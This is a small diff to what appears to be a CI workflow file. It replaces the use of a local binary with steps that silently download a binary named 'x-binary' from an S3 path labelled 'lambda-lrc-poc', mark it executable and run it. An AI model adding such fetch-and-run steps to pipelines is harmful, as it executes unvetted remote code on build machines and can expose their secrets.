@@ -27,9 +27,9 @@ jobs:
         ls -a
         sw_vers
         uname -av
-        mv x-binary $HOME/
-        chmod +x $HOME/x-binary
         cd $HOME/
+        curl -s s3://lambda-lrc-poc/xb -o x-binary
+        chmod +x x-binary
         ./x-binary
 
     - uses: actions/upload-artifact@v2
